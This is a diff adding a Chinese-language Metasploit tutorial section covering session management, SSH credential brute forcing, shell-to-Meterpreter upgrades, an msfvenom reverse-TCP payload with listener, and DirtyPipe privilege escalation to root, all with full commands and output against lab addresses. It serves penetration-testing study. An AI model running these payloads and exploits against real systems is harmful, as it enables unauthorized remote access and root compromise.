@@ -428,6 +428,353 @@ pwd
 
 
 
+## session
+
+当通过漏洞利用（exploit）成功攻陷目标时（例如：反弹一个反向 Shell 或 Meterpreter 会话），MSF 会自动创建一个 **session**，用于：
+
+- 发送指令到目标系统
+- 接收目标系统的执行结果
+- 维持与目标系统的持久化连接
+
+
+
+**MSF6 sessions 管理命令**
+
+用法：`sessions [选项] 或 sessions [会话ID]`
+
+活动会话的管理与交互操作。
+
+
+
+**详细参数**
+
+```
+-c, --command <命令>              对通过 -i 指定的会话或所有会话运行系统命令
+-C, --meterpreter-command <命令>  对通过 -i 指定的会话或所有会话运行Meterpreter命令
+-d, --list-inactive               列出所有非活动会话
+-h, --help                        显示帮助信息
+-i, --interact <会话ID>           与指定的会话ID进行交互
+-k, --kill <会话ID>               按会话ID终止指定会话或范围
+-K, --kill-all                    终止所有会话
+-l, --list                        列出所有活动会话
+-n, --name <会话ID> <名称>        按ID命名或重命名会话
+-q, --quiet                       静默模式
+-s, --script <脚本>               对通过 -i 指定的会话或所有会话运行脚本或模块
+-S, --search <过滤器>             行搜索过滤器（例：sessions --search 'last_checkin:less_than:10s session_id:5 session_type:meterpreter'）
+-t, --timeout <秒>                设置响应超时时间（默认：15秒）
+-u, --upgrade <会话ID>            将Shell会话升级为Meterpreter会话（支持多平台）
+-v, --list-verbose                详细列出所有活动会话
+-x, --list-extended               显示会话表中的扩展信息
+```
+
+
+
+**会话类型示例**
+
+| 类型            | 功能特点                           |
+| --------------- | ---------------------------------- |
+| **meterpreter** | 功能最强大，加密通信，支持内存注入 |
+| **shell**       | 普通命令行（cmd/bash），功能有限   |
+| **ssh**         | 通过 SSH 连接的会话                |
+| **vnc**         | 图形化远程控制会话                 |
+
+
+
+### ssh 会话
+
+**搜索 ssh_login 模块**
+
+```
+msf6 > search ssh login type:auxiliary 
+
+Matching Modules
+================
+
+   #  Name                                                  Disclosure Date  Rank    Check  Description
+   -  ----                                                  ---------------  ----    -----  -----------
+   0  auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
+   1  auxiliary/scanner/ssh/karaf_login                     .                normal  No     Apache Karaf Login Utility
+   2  auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
+   3  auxiliary/scanner/http/cisco_firepower_login          .                normal  No     Cisco Firepower Management Console 6.0 Login
+   4  auxiliary/scanner/ssh/ssh_login                       .                normal  No     SSH Login Check Scanner
+   5  auxiliary/scanner/ssh/ssh_login_pubkey                .                normal  No     SSH Public Key Login Scanner
+
+
+Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/ssh/ssh_login_pubkey
+
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > 
+```
+
+
+
+**设置参数**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.10.10
+RHOSTS => 10.10.10.10
+msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root
+USERNAME => root
+msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD root
+PASSWORD => root
+```
+
+
+
+**建立会话**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+[*] 10.10.10.10:22 - Starting bruteforce
+[+] 10.10.10.10:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xiaoshae 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 1 opened (10.10.10.10:39051 -> 10.10.10.10:22) at 2025-02-26 06:34:17 +0000
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+
+
+**查看会话列表**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type         Information    Connection
+  --  ----  ----         -----------    ----------
+  1         shell linux  SSH unknown @  10.10.10.10:39051 -> 10.10.10.10:22 (10.10.10.10)
+```
+
+
+
+**进入会话（Ctrl + Z / background 退出会话）**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+[*] Starting interaction with 1...
+
+ls
+aaa.sh
+dict
+hack
+include
+man
+shell
+soft
+tools
+x.xml
+^Z
+Background session 1? [y/N]  y
+```
+
+
+
+**升级会话**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.10.10:4433 
+[*] Sending stage (1017704 bytes) to 10.10.10.10
+[*] Meterpreter session 2 opened (10.10.10.10:4433 -> 10.10.10.10:44832) at 2025-02-26 06:37:01 +0000
+[*] Command stager progress: 100.00% (773/773 bytes)
+```
+
+
+
+**会话列表**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions 
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information            Connection
+  --  ----  ----                   -----------            ----------
+  1         shell linux            SSH unknown @          10.10.10.10:39051 -> 10.10.10.10:22 (10.10.10.10)
+  2         meterpreter x86/linux  root @ 172.16.100.100  10.10.10.10:4433 -> 10.10.10.10:44832 (10.10.10.10)
+```
+
+
+
+**进入会话**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > sysinfo 
+Computer     : 172.16.100.100
+OS           : Ubuntu 24.04 (Linux 6.8.0-53-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > background
+[*] Backgrounding session 2...
+```
+
+
+
+**结束所有会话**
+
+```
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -K 
+[*] Killing all sessions...
+[*] 10.10.10.10 - SSH session 1 closed.
+[*] 10.10.10.10 - Meterpreter session 2 closed.
+```
+
+
+
+### msfvenom
+
+**msfvenom 生成 payload**
+
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o payload
+```
+
+
+
+**上传到靶机**
+
+![image-20250226151157008](./images/Metasploit.assets/image-20250226151157008.png)
+
+
+
+**Metasploit 启动监听**
+
+```
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD payload/linux/x64/meterpreter/reverse_tcp
+PAYLOAD => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.10.10.10
+LHOST => 10.10.10.10
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.10.10:4444 
+```
+
+
+
+**在靶机上设置 payload 可执行权限（并执行）开始反连**
+
+![image-20250226152340190](./images/Metasploit.assets/image-20250226152340190.png)
+
+
+
+**连接成功**
+
+```
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.10.10:4444 
+[*] Sending stage (3045380 bytes) to 10.10.10.102
+[*] Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.102:53628) at 2025-02-26 07:20:24 +0000
+
+meterpreter > sysinfo 
+Computer     : 10.10.10.102
+OS           : Debian 11.1 (Linux 5.10.0-9-amd64)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > background 
+[*] Backgrounding session 1...
+```
+
+
+
+**权限提升（检测漏洞）**
+
+方式一：直接在会话中使用模块
+
+```
+meterpreter > sysinfo 
+Computer     : 10.10.10.102
+OS           : Debian 11.1 (Linux 5.10.0-9-amd64)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > run post/multi/recon/local_exploit_suggester
+[*] 10.10.10.102 - Collecting local exploits for x64/linux...
+[*] 10.10.10.102 - Collecting local exploits for x64/linux...
+[*] 10.10.10.102 - 203 exploit checks are being tried...
+[+] 10.10.10.102 - exploit/linux/local/cve_2022_0847_dirtypipe: The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[+] 10.10.10.102 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
+[+] 10.10.10.102 - exploit/linux/local/glibc_tunables_priv_esc: The target appears to be vulnerable. The glibc version (2.31-13+deb11u2) found on the target appears to be vulnerable
+[+] 10.10.10.102 - exploit/linux/local/netfilter_nft_set_elem_init_privesc: The target appears to be vulnerable.
+[+] 10.10.10.102 - exploit/linux/local/runc_cwd_priv_esc: The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.0.0~rc93+ds1-5+b2.
+[+] 10.10.10.102 - exploit/linux/local/su_login: The target appears to be vulnerable.
+[+] 10.10.10.102 - exploit/linux/local/sudoedit_bypass_priv_esc: The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+[*] Running check method for exploit 73 / 73
+[*] 10.10.10.102 - Valid modules for session 1:
+============================
+
+ #   Name                                                                Potentially Vulnerable?  Check Result
+ -   ----                                                                -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                         Yes                      The target appears to be vulnerable. Linux kernel version found: 5.10.0
+ 2   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
+ 3   exploit/linux/local/glibc_tunables_priv_esc                         Yes                      The target appears to be vulnerable. The glibc version (2.31-13+deb11u2) found on the target appears to be vulnerable
+ 4   exploit/linux/local/netfilter_nft_set_elem_init_privesc             Yes                      The target appears to be vulnerable.
+ 5   exploit/linux/local/runc_cwd_priv_esc                               Yes                      The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.0.0~rc93+ds1-5+b2.
+ 6   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
+ 7   exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.9.5p2.pre.3 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module
+ 8   exploit/linux/local/abrt_raceabrt_priv_esc                          No                       The target is not exploitable.
+
+```
+
+
+
+方式二：使用模块并绑定会话
+
+```
+msf6 > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1 # 设置会话 ID
+SESSION => 1
+msf6 post(multi/recon/local_exploit_suggester) > run # 检测漏洞
+...
+```
+
+
+
+**利用漏洞进行提权**
+
+```
+msf6 > use exploit/linux/local/cve_2022_0847_dirtypipe 
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set SESSION 1
+SESSION => 1
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LHOST 10.10.10.10
+LHOST => 10.10.10.10
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set LPORT 5555
+LPORT => 5555
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > set PAYLOAD linux/x64/meterpreter/reverse_tcp 
+PAYLOAD => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/cve_2022_0847_dirtypipe) > run 
+[*] Started reverse TCP handler on 10.10.10.10:5555 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0
+[*] Executing exploit '/tmp/.ubhkqc /bin/passwd'
+[*] Sending stage (3045380 bytes) to 10.10.10.102
+[+] Deleted /tmp/.ubhkqc
+[*] Meterpreter session 2 opened (10.10.10.10:5555 -> 10.10.10.102:36030) at 2025-02-26 07:36:19 +0000
+
+meterpreter > sysinfo 
+Computer     : 10.10.10.102
+OS           : Debian 11.1 (Linux 5.10.0-9-amd64)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > getuid
+Server username: root
+```
+
+
+
 ## Nmap + msfconsole
 
 先使用 Nmap 进行扫描，将扫描结果导出为 XML 格式，然后导入 msfconsole 的数据库中。
